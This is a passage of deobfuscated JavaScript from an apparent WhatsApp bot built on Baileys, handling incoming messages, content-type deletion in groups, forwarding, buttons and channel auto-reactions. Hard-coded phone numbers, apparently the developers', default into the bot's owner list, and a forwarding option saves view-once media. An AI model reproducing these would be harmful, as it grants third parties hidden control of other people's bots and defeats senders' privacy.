                      const decoded_444 = {
                        statusJidList: [decoded_359.key.remoteJidAlt || decoded_359.key.participant, decoded_441]
                      };
                      await decoded_112.sendMessage("status@broadcast", decoded_443, decoded_444);
                    }
                  }
                }
              }
              if (!decoded_243) {
                async function decoded_445() {
                  if (fs.existsSync(path.join(__dirname, decoded_057, "creds.json"))) {
                    async function decoded_446() {}
                    await decoded_446();
                  } else {
                    await sleep(5000);
                    decoded_445();
                  }
                }
                decoded_445();
                decoded_243 = true;
              }
              if (decoded_359.key && decoded_359.key.remoteJid === "status@broadcast") {
                continue;
              }
              if (!decoded_359?.["key"]?.["remoteJid"]["endsWith"]("@newsletter")) {
                if (decoded_098.ALWAYS_ONLINE === "true") {
                  decoded_112.sendPresenceUpdate("available", decoded_359.key.senderPn || decoded_359.key.remoteJidAlt || decoded_359.key.remoteJid);
                } else {
                  decoded_112.sendPresenceUpdate("unavailable", decoded_359.key.senderPn || decoded_359.key.remoteJidAlt || decoded_359.key.remoteJid);
                }
              }
              let decoded_447 = decoded_359.key.remoteJid;
              decoded_447 = jidNormalizedUser(decoded_447);
              const decoded_448 = decoded_447.endsWith("@g.us");
              const decoded_449 = decoded_448 ? decoded_094.get(decoded_447) || (await decoded_112.groupMetadata(decoded_447).then(decoded_450 => (decoded_094.set(decoded_447, decoded_450), decoded_450))["catch"](() => null)) : null;
              const decoded_451 = sms(decoded_112, decoded_359, decoded_449);
              decoded_451.chat = decoded_447;
              const decoded_452 = getContentType(decoded_359.message);
              const decoded_453 = decoded_452 === "extendedTextMessage" && decoded_359.message.extendedTextMessage?.["contextInfo"] ? decoded_359.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
              const decoded_454 = decoded_452 === "buttonsResponseMessage" ? decoded_359.message.buttonsResponseMessage?.["selectedButtonId"] || '' : decoded_452 === "interactiveResponseMessage" ? decoded_359.message.interactiveResponseMessage?.["nativeFlowResponseMessage"]?.["paramsJson"] ? JSON.parse(decoded_359.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.['id'] : '' : decoded_452 === "templateButtonReplyMessage" ? decoded_359.message.templateButtonReplyMessage?.["selectedId"] || '' : decoded_452 === "conversation" ? decoded_359.message.conversation || '' : decoded_452 === "extendedTextMessage" ? decoded_359.message.extendedTextMessage?.["text"] || '' : decoded_452 === "imageMessage" && decoded_359.message.imageMessage?.["caption"] ? decoded_359.message.imageMessage.caption : decoded_452 === "videoMessage" && decoded_359.message.videoMessage?.["caption"] ? decoded_359.message.videoMessage.caption : '';
              const decoded_455 = decoded_454.startsWith(decoded_099);
              const decoded_456 = decoded_455 ? decoded_454.slice(decoded_099.length).trim().split(" ").shift().toLowerCase() : '';
              const decoded_457 = decoded_454.trim().split(/ +/).slice(1);
              const decoded_458 = decoded_457.join(" ");
              const decoded_459 = decoded_447.endsWith("@newsletter");
              let decoded_460 = decoded_451.sender;
              const decoded_461 = decoded_451.sender.split('@')[0];
              const decoded_462 = jidNormalizedUser(decoded_112.user.id).split('@')[0];
              const decoded_463 = decoded_359.pushName || "No Name";
              const decoded_464 = !!decoded_451?.["message"]?.["reactionMessage"];
              const decoded_465 = decoded_451?.["fromMe"];
              const decoded_466 = decoded_098.SUDO ? decoded_098.SUDO.includes(',') ? decoded_098.SUDO.split(',') : [decoded_098.SUDO] : [];
              const decoded_467 = [decoded_106.coOwner || "94725881990", decoded_106.owner || "94762280384", decoded_106.officialOtherOwners || "94717782930"];
              const decoded_468 = [...decoded_466, ...decoded_467].map(decoded_469 => decoded_469.trim());
              const decoded_470 = decoded_465 || decoded_468.includes(decoded_461);
              const decoded_471 = [decoded_106.coOwner || "94725881990", decoded_106.owner || "94762280384", decoded_106.officialOtherOwners || "94717782930"].map(decoded_472 => decoded_472.trim());
              const decoded_473 = decoded_471.includes(decoded_461);
              const decoded_474 = await jidNormalizedUser(decoded_112.user.id);
              const decoded_475 = decoded_448 && decoded_449 ? decoded_449.participants : [];
              const decoded_476 = decoded_448 && decoded_449 ? decoded_449.subject : '';
              const decoded_477 = decoded_448 ? decoded_475.filter(decoded_478 => decoded_478?.["admin"] !== null).map(decoded_479 => decoded_479.jid || decoded_479.id) : [];
              const decoded_480 = decoded_448 && decoded_477.includes(decoded_474);
              const decoded_481 = decoded_448 && decoded_477.includes(decoded_451.sender);
              if (decoded_448 && !decoded_481 && !decoded_470 && decoded_480) {
                const decoded_482 = await getGroupSetting("DELETE_TYPE", decoded_447, decoded_037);
                const decoded_483 = (decoded_482 || '').toLowerCase().split(',').map(decoded_484 => decoded_484.trim());
                if (decoded_483.length > 0 && decoded_483[0] !== '') {
                  const decoded_485 = decoded_359.message;
                  const decoded_486 = decoded_485?.["ephemeralMessage"]?.["message"] || decoded_485?.["viewOnceMessage"]?.["message"] || decoded_485?.["viewOnceMessageV2"]?.["message"] || decoded_485;
                  if (decoded_486) {
                    const decoded_487 = Object.keys(decoded_486)[0];
                    const decoded_488 = decoded_454.includes("http://") || decoded_454.includes("https://") || decoded_454.includes("www.");
                    const decoded_489 = decoded_487 === "viewOnceMessage" || decoded_487 === "viewOnceMessageV2" || decoded_359.key.isViewOnce;
                    let decoded_490 = '';
                    if (decoded_489) {
                      decoded_490 = "viewonce";
                    } else {
                      if (decoded_487 === "imageMessage") {
                        decoded_490 = "photo";
                      } else {
                        if (decoded_487 === "videoMessage" || decoded_487 === "ptvMessage") {
                          decoded_490 = "video";
                        } else {
                          if (decoded_487 === "stickerMessage" || decoded_487 === "lottieStickerMessage") {
                            decoded_490 = "sticker";
                          } else {
                            if (decoded_487 === "audioMessage") {
                              decoded_490 = "audio";
                            } else {
                              if (decoded_487 === "documentMessage") {
                                decoded_490 = "doc";
                              } else {
                                if (decoded_487 === "locationMessage" || decoded_487 === "liveLocationMessage") {
                                  decoded_490 = "location";
                                } else {
                                  if (decoded_487 === "contactMessage" || decoded_487 === "contactsArrayMessage") {
                                    decoded_490 = "contact";
                                  } else {
                                    if (decoded_487 === "pollCreationMessage" || decoded_487 === "pollCreationMessageV2" || decoded_487 === "pollCreationMessageV3") {
                                      decoded_490 = "poll";
                                    } else {
                                      if (decoded_487 === "buttonsMessage" || decoded_487 === "templateMessage" || decoded_487 === "interactiveMessage" || decoded_487 === "buttonsResponseMessage" || decoded_487 === "templateButtonReplyMessage") {
                                        decoded_490 = "button";
                                      } else {
                                        if (decoded_487 === "listMessage" || decoded_487 === "listResponseMessage") {
                                          decoded_490 = "list";
                                        } else {
                                          if (decoded_488) {
                                            decoded_490 = "links";
                                          } else if ((decoded_487 === "conversation" || decoded_487 === "extendedTextMessage") && !decoded_488) {
                                            if (decoded_454.startsWith(decoded_098.PREFIX)) {
                                              decoded_490 = "cmd";
                                            } else {
                                              decoded_490 = "text";
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                    if (decoded_490 && decoded_483.includes(decoded_490)) {
                      const decoded_491 = {
                        "delete": decoded_359.key
                      };
                      await decoded_112.sendMessage(decoded_447, decoded_491);
                      const decoded_492 = decoded_447 + '-' + decoded_460;
                      if (!decoded_092.has(decoded_492)) {
                        const decoded_493 = {
                          viewonce: "View-Once 💣",
                          photo: "Photos 🖼️",
                          video: "Videos 🎥",
                          sticker: "Stickers 🃏",
                          audio: "Audio 🎵",
                          doc: "Files 📂",
                          location: "Location 📍",
                          contact: "Contacts 👤",
                          poll: "Polls 📊",
                          button: "Buttons 🔘",
                          list: "List Msg 📜",
                          links: "Links 🔗",
                          text: "Text Msg 📝",
                          cmd: "Bot Commands 🤖"
                        };
                        const decoded_494 = decoded_493[decoded_490] || "Restricted Content";
                        const decoded_495 = decoded_460.split('@')[0];
                        const decoded_496 = decoded_495.startsWith('94');
                        const decoded_497 = decoded_496 ? "✋ පොඩ්ඩක් ඉන්න මිස්ටර් @" + decoded_495 + ".\n🤨 මගේ System එකට අහු වුනා ඔයා මෙතනට *" + decoded_494 + "* දාන්න හැදුවා කියලා.\n\n🚫 *හේතුව:* මගේ Owner මේකට *" + decoded_494 + "* දාන එක Block කරලා තියෙන නිසා මම මේක Delete කරනවා.\n\n_⛔ මම ආයේ මේ Warning එක එවන්නේ නෑ. ඒ නිසා ආයේ මේ වගේ දේවල් දාන්න උත්සාහ කරන්නවත් එපා!_" : "✋ Oops, Mr. @" + decoded_495 + ".\n🤨 My System detected unauthorized *" + decoded_494 + "* debris entering the chat.\n\n🚫 *Reason:* My Owner has blocked *" + decoded_494 + "* here, so I am deleting it.\n\n_⛔ I won't waste my time repeating this. Don't even attempt to send this kind of content again!_";
                        const decoded_498 = {
                          text: decoded_497,
                          mentions: [decoded_460]
                        };
                        await decoded_112.sendMessage(decoded_447, decoded_498);
                        decoded_092.add(decoded_492);
                      }
                      continue;
                    }
                  }
                }
              }
              if (!decoded_359?.["key"]?.["remoteJid"]["endsWith"]("@newsletter")) {
                if (decoded_098.READ_MESSAGE === "all") {
                  decoded_112.readMessages([decoded_359.key])["catch"](() => {});
                }
                if (decoded_098.READ_MESSAGE === "commands" && decoded_455) {
                  decoded_112.readMessages([decoded_359.key])["catch"](() => {});
                }
              }
              const decoded_499 = decoded_500 => {
                const decoded_501 = {
                  text: decoded_500
                };
                const decoded_502 = {
                  quoted: decoded_359
                };
                decoded_112.sendMessage(decoded_447, decoded_501, decoded_502);
              };
              decoded_112.forwardMessage = async (decoded_503, decoded_504, decoded_505 = false, decoded_506 = {}) => {
                if (decoded_503.endsWith("@g.us")) {
                  let decoded_507 = decoded_094.get(decoded_503);
                  if (!decoded_507) {
                    try {
                      decoded_507 = await decoded_112.groupMetadata(decoded_503);
                      if (decoded_507) {
                        decoded_094.set(decoded_503, decoded_507);
                      }
                    } catch (decoded_508) {
                      console.warn("[Forward] Bot is not in group " + decoded_503 + ". Skipping forward.");
                      return;
                    }
                  }
                  if (!decoded_507) {
                    console.warn("[Forward] Could not verify group metadata for " + decoded_503 + ". Skipping forward.");
                    return;
                  }
                }
                let decoded_509 = decoded_504;
                if (decoded_509.message) {
                  decoded_509 = decoded_509.message.ephemeralMessage ? decoded_509.message.ephemeralMessage.message : decoded_509.message;
                }
                const decoded_510 = Object.keys(decoded_509)[0];
                const decoded_511 = decoded_510 === "viewOnceMessage" || decoded_510 === "viewOnceMessageV2";
                const decoded_512 = decoded_513 => {
                  if (!decoded_513) {
                    return null;
                  }
                  const decoded_514 = ["mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "wmv", "mpg", "mpeg", "mp3", "m4a", "ogg", "wav", "opus", "aac", "wma", "flac", "amr", "jpg", "jpeg", "png", "webp", "gif", "bmp", "tiff", "ico", "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "rtf", "csv", "zip", "rar", '7z', "tar", 'gz', "bz2", "apk", "iso", "bin", "exe", "dmg"];
                  const decoded_515 = new RegExp("\\b[\\w\\s\\-\\(\\)\\[\\]\\.]+\\.(" + decoded_514.join('|') + ")\\b", 'i');
                  const decoded_516 = decoded_513.match(decoded_515);
                  if (decoded_516) {
                    return decoded_516[0].trim();
                  }
                  let decoded_517 = decoded_513.split("\n")[0];
                  decoded_517 = decoded_517.replace(/[\*\_\~\`\>]/g, '').trim();
                  return decoded_517.length > 0 ? decoded_517 : null;
                };
                if (decoded_506.readViewOnce && decoded_511) {
                  const decoded_518 = decoded_509[decoded_510].message;
                  const decoded_519 = Object.keys(decoded_518)[0];
                  if (decoded_519 === "imageMessage" || decoded_519 === "videoMessage") {
                    const decoded_520 = decoded_519 === "imageMessage" ? "image" : "video";
                    const decoded_521 = await downloadContentFromMessage(decoded_518[decoded_519], decoded_520);
                    let decoded_522 = Buffer.from([]);
                    for await (const decoded_523 of decoded_521) {
                      decoded_522 = Buffer.concat([decoded_522, decoded_523]);
                    }
                    if (!decoded_506.fileName) {
                      const decoded_524 = decoded_512(decoded_518[decoded_519].caption);
                      if (decoded_524) {
                        decoded_506.fileName = decoded_524;
                      }
                    }
                    const decoded_525 = {
                      [decoded_520]: decoded_522,
                      'caption': decoded_518[decoded_519].caption || '',
                      'mimetype': decoded_518[decoded_519].mimetype,
                      ...decoded_506
                    };
                    return await decoded_112.sendMessage(decoded_503, decoded_525, decoded_506);
                  }
                }
                try {
                  if (!decoded_506.fileName) {
                    const decoded_526 = decoded_509[decoded_510]?.["caption"] || decoded_509[decoded_510]?.["contentText"] || decoded_509.message?.["documentMessage"]?.["caption"] || '';
                    const decoded_527 = decoded_512(decoded_526);
                    if (decoded_527) {
                      decoded_506.fileName = decoded_527;
                    }
                  }
                  const decoded_528 = await generateForwardMessageContent(decoded_504, decoded_505);
                  const decoded_529 = await generateWAMessageFromContent(decoded_503, decoded_528, decoded_506);
                  await decoded_112.relayMessage(decoded_503, decoded_529.message, {
                    'messageId': decoded_529.key.id
                  });
                  return decoded_529;
                } catch (decoded_530) {
                  console.error("Failed to forward message using relay:", decoded_530);
                }
              };
              decoded_112.btn = async (decoded_531, decoded_532, decoded_533, decoded_534 = {}, decoded_535 = {}) => {
                const decoded_536 = [];
                for (const decoded_537 of decoded_532) {
                  if (decoded_537.type === "reply") {
                    for (const decoded_538 of decoded_537.value) {
                      const decoded_539 = {
                        buttonId: decoded_538[1],
                        buttonText: {},
                        type: "RESPONSE"
                      };
                      decoded_539.buttonText.displayText = decoded_538[0];
                      decoded_536.push(decoded_539);
                    }
                  } else {
                    if (decoded_537.type === "url") {
                      for (const decoded_540 of decoded_537.value) {
                        decoded_536.push({
                          'buttonId': "url_" + decoded_540[1],
                          'buttonText': {
                            'displayText': decoded_540[0]
                          },
                          'type': "NATIVE_FLOW",
                          'nativeFlowInfo': {
                            'name': "cta_url",
                            'paramsJson': JSON.stringify({
                              'display_text': decoded_540[0],
                              'url': decoded_540[1]
                            })
                          }
                        });
                      }
                    } else {
                      if (decoded_537.type === "copy") {
                        for (const decoded_541 of decoded_537.value) {
                          decoded_536.push({
                            'buttonId': "copy_" + decoded_541[1],
                            'buttonText': {
                              'displayText': decoded_541[0]
                            },
                            'type': "NATIVE_FLOW",
                            'nativeFlowInfo': {
                              'name': "cta_copy",
                              'paramsJson': JSON.stringify({
                                'display_text': decoded_541[0],
                                'id': decoded_541[1],
                                'copy_code': decoded_541[1]
                              })
                            }
                          });
                        }
                      } else {
                        if (decoded_537.type === "list") {
                          const decoded_542 = decoded_537.value.map(decoded_543 => ({
                            ...(decoded_543.headers ? {
                              'title': decoded_543.headers
                            } : {}),
                            'rows': decoded_543.rows.map(decoded_544 => ({
                              'header': decoded_544.headers,
                              'title': decoded_544.title,
                              'description': decoded_544.body,
                              'id': decoded_544.command
                            }))
                          }));
                          const decoded_545 = {
                            title: decoded_537.title,
                            sections: decoded_542
                          };
                          decoded_536.push({
                            'buttonId': "list_action",
                            'buttonText': {
                              'displayText': decoded_537.title || "Select Option"
                            },
                            'type': "NATIVE_FLOW",
                            'nativeFlowInfo': {
                              'name': "single_select",
                              'paramsJson': JSON.stringify(decoded_545)
                            }
                          });
                        }
                      }
                    }
                  }
                }
                let decoded_546 = {};
                let decoded_547 = "UNKNOWN";
                if (decoded_534.url) {
                  const decoded_548 = await decoded_112.getFile(decoded_534.url);
                  const decoded_549 = decoded_548.mime.split('/')[0];
                  const decoded_550 = {
                    image: decoded_548.data
                  };
                  const decoded_551 = {
                    video: decoded_548.data
                  };
                  const decoded_552 = {
                    upload: decoded_112.waUploadToServer
                  };
                  const decoded_553 = await prepareWAMessageMedia({
                    ...(decoded_549 === "image" ? decoded_550 : decoded_549 === "video" ? decoded_551 : {
                      'document': decoded_548.data,
                      'mimetype': decoded_548.mime,
                      'fileName': decoded_534.filename || "pmd." + decoded_548.mime.split('/')[1]
                    })
                  }, decoded_552);
                  decoded_546 = decoded_553;
                  decoded_547 = decoded_549 === "image" ? "IMAGE" : decoded_549 === "video" ? "VIDEO" : "DOCUMENT";
                } else {
                  if (decoded_534.header) {
                    const decoded_554 = {
                      text: decoded_534.header
                    };
                    decoded_546 = decoded_554;
                    decoded_547 = "TEXT";
                  } else {
                    decoded_547 = "EMPTY";
                  }
                }
                const decoded_555 = {
                  'contentText': decoded_534.body || '',
                  'footerText': decoded_534.footer || '',
                  'contextInfo': decoded_535.contextInfo || {},
                  'buttons': decoded_536,
                  'headerType': decoded_547,
                  ...decoded_546
                };
                const decoded_556 = {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 0x2
                };
                const decoded_557 = {
                  messageContextInfo: decoded_556,
                  buttonsMessage: decoded_555
                };
                const decoded_558 = {
                  message: decoded_557
                };
                const decoded_559 = {
                  viewOnceMessage: decoded_558
                };
                const decoded_560 = {
                  'userJid': decoded_112.user?.["jid"],
                  'quoted': decoded_533,
                  'upload': decoded_112.waUploadToServer,
                  ...decoded_535.ephemeral
                };
                const decoded_561 = generateWAMessageFromContent(decoded_531, decoded_559, decoded_560);
                await decoded_112.relayMessage(decoded_561.key.remoteJid, decoded_561.message, {
                  'messageId': decoded_561.key.id
                });
                return decoded_561;
              };
              decoded_112.sendButtonMessage = async (decoded_562, decoded_563, decoded_564, decoded_565 = {}) => {
                let decoded_566;
                if (decoded_565?.["video"]) {
                  const decoded_567 = {
                    url: decoded_565 && decoded_565.video ? decoded_565.video : ''
                  };
                  const decoded_568 = {
                    video: decoded_567
                  };
                  const decoded_569 = {
                    upload: decoded_112.waUploadToServer
                  };
                  var decoded_570 = await prepareWAMessageMedia(decoded_568, decoded_569);
                  const decoded_571 = {
                    title: decoded_565 && decoded_565.header ? decoded_565.header : '',
                    hasMediaAttachment: true,
                    videoMessage: decoded_570.videoMessage
                  };
                  decoded_566 = decoded_571;
                } else {
                  if (decoded_565?.["image"]) {
                    const decoded_572 = {
                      url: decoded_565 && decoded_565.image ? decoded_565.image : ''
                    };
                    const decoded_573 = {
                      image: decoded_572
                    };
                    const decoded_574 = {
                      upload: decoded_112.waUploadToServer
                    };
                    var decoded_575 = await prepareWAMessageMedia(decoded_573, decoded_574);
                    const decoded_576 = {
                      title: decoded_565 && decoded_565.header ? decoded_565.header : '',
                      hasMediaAttachment: true,
                      imageMessage: decoded_575.imageMessage
                    };
                    decoded_566 = decoded_576;
                  } else {
                    const decoded_577 = {
                      title: decoded_565 && decoded_565.header ? decoded_565.header : '',
                      hasMediaAttachment: false
                    };
                    decoded_566 = decoded_577;
                  }
                }
                let decoded_578;
                if (decoded_565 && decoded_565.contextInfo) {
                  const decoded_579 = {
                    text: decoded_565 && decoded_565.body ? decoded_565.body : ''
                  };
                  const decoded_580 = {
                    text: decoded_565 && decoded_565.footer ? decoded_565.footer : ''
                  };
                  const decoded_581 = {
                    buttons: decoded_563,
                    messageParamsJson: ''
                  };
                  const decoded_582 = {
                    body: decoded_579,
                    footer: decoded_580,
                    header: decoded_566,
                    nativeFlowMessage: decoded_581,
                    contextInfo: decoded_565 && decoded_565.contextInfo ? decoded_565.contextInfo : ''
                  };
                  decoded_578 = decoded_582;
                } else {
                  const decoded_583 = {
                    text: decoded_565 && decoded_565.body ? decoded_565.body : ''
                  };
                  const decoded_584 = {
                    text: decoded_565 && decoded_565.footer ? decoded_565.footer : ''
                  };
                  const decoded_585 = {
                    buttons: decoded_563,
                    messageParamsJson: ''
                  };
                  const decoded_586 = {
                    body: decoded_583,
                    footer: decoded_584,
                    header: decoded_566,
                    nativeFlowMessage: decoded_585
                  };
                  decoded_578 = decoded_586;
                }
                const decoded_587 = {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 0x2
                };
                const decoded_588 = {
                  messageContextInfo: decoded_587,
                  interactiveMessage: decoded_578
                };
                const decoded_589 = {
                  message: decoded_588
                };
                const decoded_590 = {
                  viewOnceMessage: decoded_589
                };
                const decoded_591 = {
                  'userJid': decoded_112.user?.["jid"],
                  'quoted': decoded_564,
                  'upload': decoded_112.waUploadToServer,
                  ...decoded_565.ephemeral
                };
                let decoded_592 = generateWAMessageFromContent(decoded_562, decoded_590, decoded_591);
                return await decoded_112.relayMessage(decoded_562, decoded_592.message, {
                  'messageId': decoded_592.key.id
                });
              };
              async function decoded_593(decoded_594) {
                const decoded_595 = {
                  url: decoded_594
                };
                const decoded_596 = {
                  video: decoded_595
                };
                const decoded_597 = {
                  upload: decoded_112.waUploadToServer
                };
                const decoded_598 = await prepareWAMessageMedia(decoded_596, decoded_597);
                const decoded_599 = {
                  type: "videoMessage"
                };
                decoded_599.message = decoded_598.videoMessage;
                return decoded_599;
              }
              async function decoded_600(decoded_601) {
                const decoded_602 = {
                  url: decoded_601
                };
                const decoded_603 = {
                  image: decoded_602
                };
                const decoded_604 = {
                  upload: decoded_112.waUploadToServer
                };
                const decoded_605 = await prepareWAMessageMedia(decoded_603, decoded_604);
                const decoded_606 = {
                  type: "imageMessage",
                  message: decoded_605.imageMessage
                };
                return decoded_606;
              }
              decoded_112.carasoulMessage = async (decoded_607, decoded_608, decoded_609) => {
                const decoded_610 = await Promise.all(decoded_608.map(async decoded_611 => {
                  let decoded_612;
                  if (decoded_611.video) {
                    decoded_612 = await decoded_593(decoded_611.video);
                  } else if (decoded_611.image) {
                    decoded_612 = await decoded_600(decoded_611.image);
                  }
                  const decoded_613 = {
                    'hasMediaAttachment': !!decoded_612,
                    ...(decoded_612 && {
                      [decoded_612.type]: decoded_612.message
                    })
                  };
                  const decoded_614 = {
                    header: decoded_613,
                    body: decoded_611.caption || '',
                    nativeFlowMessage: {}
                  };
                  decoded_614.nativeFlowMessage.buttons = decoded_611.buttons || '';
                  decoded_614.nativeFlowMessage.messageParamsJson = '';
                  return decoded_614;
                }));
                const decoded_615 = {
                  text: decoded_609
                };
                const decoded_616 = {
                  cards: decoded_610,
                  messageVersion: 0x1
                };
                const decoded_617 = {
                  body: decoded_615,
                  carouselMessage: decoded_616
                };
                const decoded_618 = {
                  interactiveMessage: decoded_617
                };
                const decoded_619 = {
                  message: decoded_618
                };
                const decoded_620 = {
                  viewOnceMessage: decoded_619
                };
                const decoded_621 = generateWAMessageFromContent(decoded_607, decoded_620, {});
                await decoded_499(JSON.stringify(decoded_621.message, null, 2));
                await decoded_112.relayMessage(decoded_607, decoded_621.message, {
                  'messageId': decoded_621.key.id
                });
              };
              decoded_112.getFile = async decoded_622 => {
                const decoded_623 = (await import("mime-types"))["default"];
                const decoded_624 = (await import("file-type"))["default"];
                let decoded_625;
                let decoded_626;
                const decoded_627 = Buffer.isBuffer(decoded_622) ? decoded_622 : /^data:.*?\/.*?;base64,/i.test(decoded_622) ? Buffer.from(decoded_622.split`,`[1], "base64") : /^https?:\/\//.test(decoded_622) ? decoded_625 = await axios.get(decoded_622, {
                  'responseType': "arraybuffer"
                }) : fs.existsSync(decoded_622) ? (decoded_626 = decoded_622, fs.readFileSync(decoded_622)) : typeof decoded_622 === "string" ? decoded_622 : Buffer.alloc(0);
                if (!Buffer.isBuffer(decoded_627.data || decoded_627)) {
                  throw new TypeError("Result is not a buffer");
                }
                const decoded_628 = decoded_625 ? {
                  'mime': decoded_625.headers["content-type"],
                  'ext': decoded_623.extension(decoded_625.headers["content-type"])
                } : (await decoded_624.fromBuffer(decoded_627)) || {
                  'mime': "application/bin",
                  'ext': ".bin"
                };
                return {
                  'filename': decoded_626,
                  ...decoded_628,
                  'data': decoded_627.data ? decoded_627.data : decoded_627,
                  'deleteFile'() {
                    return decoded_626 && fs.promises.unlink(decoded_626);
                  }
                };
              };
              decoded_112.sendFileUrl = async (decoded_629, decoded_630, decoded_631, decoded_632, decoded_633 = {}) => {
                let decoded_634 = '';
                let decoded_635 = await axios.head(decoded_630);
                decoded_634 = decoded_635.headers["content-type"];
                if (decoded_634.split('/')[1] === "gif") {
                  return decoded_112.sendMessage(decoded_629, {
                    'video': await getBuffer(decoded_630),
                    'caption': decoded_631,
                    'gifPlayback': true,
                    ...decoded_633
                  }, {
                    'quoted': decoded_632,
                    ...decoded_633
                  });
                }
                if (decoded_634 === "application/pdf") {
                  return decoded_112.sendMessage(decoded_629, {
                    'document': await getBuffer(decoded_630),
                    'mimetype': "application/pdf",
                    'caption': decoded_631,
                    ...decoded_633
                  }, {
                    'quoted': decoded_632,
                    ...decoded_633
                  });
                }
                if (decoded_634.split('/')[0] === "image") {
                  return decoded_112.sendMessage(decoded_629, {
                    'image': await getBuffer(decoded_630),
                    'caption': decoded_631,
                    ...decoded_633
                  }, {
                    'quoted': decoded_632,
                    ...decoded_633
                  });
                }
                if (decoded_634.split('/')[0] === "video") {
                  return decoded_112.sendMessage(decoded_629, {
                    'video': await getBuffer(decoded_630),
                    'caption': decoded_631,
                    'mimetype': "video/mp4",
                    ...decoded_633
                  }, {
                    'quoted': decoded_632,
                    ...decoded_633
                  });
                }
                if (decoded_634.split('/')[0] === "audio") {
                  return decoded_112.sendMessage(decoded_629, {
                    'audio': await getBuffer(decoded_630),
                    'caption': decoded_631,
                    'mimetype': "audio/mpeg",
                    ...decoded_633
                  }, {
                    'quoted': decoded_632,
                    ...decoded_633
                  });
                }
              };
              const decoded_636 = decoded_098.BANNED_GROUPS || '';
              const decoded_637 = decoded_636.split(',').map(decoded_638 => decoded_638.trim());
              if (decoded_637.includes(decoded_359.key.remoteJid)) {
                continue;
                ;
              }
              const decoded_639 = async (decoded_640, decoded_641) => {
                const {
                  key: decoded_642,
                  message: decoded_643
                } = decoded_641;
                const decoded_644 = !!decoded_643?.["reactionMessage"];
                const decoded_645 = decoded_106.isOwnerReactStatus || "true";
                if (decoded_645 !== "true" || decoded_644 || !decoded_451.sender) {
                  return;
                }
                const decoded_646 = decoded_106.ReactFalseGroups || '';
                const decoded_647 = decoded_646.split(',').map(decoded_648 => decoded_648.trim());
                if (decoded_647.includes(decoded_447)) {
                  return;
                }
                const decoded_649 = decoded_640.user.id.split(':')[0];
                if (decoded_451.sender.startsWith(decoded_649)) {
                  return;
                }
                const decoded_650 = decoded_106.officialOtherOwners || '';
                const decoded_651 = decoded_650.split(',').map(decoded_652 => decoded_652.trim()).filter(decoded_653 => decoded_653);
                const decoded_654 = {
                  number: decoded_106.owner || "94762280384",
                  react: decoded_106.ownerReact || "👨‍💻"
                };
                const decoded_655 = {
                  number: decoded_106.coOwner || "94725881990",
                  react: decoded_106.coOwnerReact || "👨‍🔧"
                };
                const decoded_656 = [decoded_654, decoded_655];
                decoded_651.forEach(decoded_657 => {
                  const decoded_658 = {
                    number: decoded_657,
                    react: decoded_106.officialOtherOwnersReact || '🪄'
                  };
                  decoded_656.push(decoded_658);
                });
                const decoded_659 = decoded_451.sender.split('@')[0];
                const decoded_660 = decoded_656.find(decoded_661 => decoded_661.number === decoded_659);
                if (decoded_660) {
                  await decoded_640.sendMessage(decoded_641.key.senderPn || decoded_641.key.remoteJid, {
                    'react': {
                      'text': decoded_660.react,
                      'key': decoded_641.key
                    }
                  });
                }
              };
              if (!decoded_459) {
                decoded_639(decoded_112, decoded_359);
              }
              if (decoded_459 && true) {
                if (!global.channelCache) {
                  global.channelCache = new Map();
                }
                const decoded_662 = decoded_663 => {
                  if (!decoded_663 || typeof decoded_663 !== "string") {
                    return null;
                  }
                  const decoded_664 = decoded_663.match(/channel\/([a-zA-Z0-9_-]+)/);
                  return decoded_664 ? decoded_664[1] : decoded_663.trim();
                };
                let decoded_665 = [];
                const decoded_666 = decoded_662(decoded_106.cjidprabath);
                if (decoded_666) {
                  const decoded_667 = {
                    inviteCode: decoded_666,
                    enabled: decoded_106.crps,
                    emojis: decoded_106.cpr
                  };
                  decoded_665.push(decoded_667);
                }
                const decoded_668 = decoded_662(decoded_106.cjidsachintha);
                if (decoded_668) {
                  const decoded_669 = {
                    inviteCode: decoded_668,
                    enabled: decoded_106.crss,
                    emojis: decoded_106.csr
                  };
                  decoded_665.push(decoded_669);
                }
                const decoded_670 = String(decoded_106.allChannelReactStatus) === "true";
                if (decoded_106.allChannels && typeof decoded_106.allChannels === "string" && decoded_670) {
                  const decoded_671 = decoded_106.allChannels.split(',');
                  const decoded_672 = decoded_106.allChannelsReact || '👍';
                  for (const decoded_673 of decoded_671) {
                    const decoded_674 = decoded_662(decoded_673);
                    if (decoded_674) {
                      const decoded_675 = decoded_665.some(decoded_676 => decoded_676.inviteCode === decoded_674);
                      if (!decoded_675) {
                        const decoded_677 = {
                          inviteCode: decoded_674,
                          enabled: true,
                          emojis: decoded_672
                        };
                        decoded_665.push(decoded_677);
                      }
                    }
                  }
                }
                for (const decoded_678 of decoded_665) {
                  if (!decoded_678.enabled || !decoded_678.inviteCode) {
                    continue;
                  }
                  let decoded_679 = global.channelCache.get(decoded_678.inviteCode);
                  if (!decoded_679) {
                    try {
                      const decoded_680 = await decoded_112.newsletterMetadata("invite", decoded_678.inviteCode);
                      if (decoded_680 && decoded_680.id) {
                        decoded_679 = decoded_680.id;
                        global.channelCache.set(decoded_678.inviteCode, decoded_679);
                      }
                    } catch (decoded_681) {
                      continue;
                    }
                  }
                  if (decoded_679 && decoded_359.key.remoteJid === decoded_679) {
                    if (decoded_464 || decoded_451.sender === decoded_474) {
                      continue;
                    }
                    const decoded_682 = decoded_359.key.server_id || decoded_359.newsletterServerId;
                    if (decoded_682) {
                      try {
                        const decoded_683 = Math.floor(Math.random() * 3001) + 2000;
                        await sleep(decoded_683);
                        const decoded_684 = decoded_289(decoded_454);
                        let decoded_685;
                        if (decoded_684) {
                          decoded_685 = '😢';
                        } else {
                          if (decoded_678.emojis && typeof decoded_678.emojis === "string" && decoded_678.emojis.includes(',')) {
                            const decoded_686 = decoded_678.emojis.split(',');
                            decoded_685 = decoded_686[Math.floor(Math.random() * decoded_686.length)];
                          } else {
                            decoded_685 = decoded_678.emojis || '👍';
                          }
                        }
                        await decoded_112.newsletterReactMessage(decoded_679, decoded_682, decoded_685);
                      } catch (decoded_687) {}
                    }
                  }
                }
              }
              let decoded_688 = decoded_454.toLowerCase();
              if (decoded_688 === "update") {
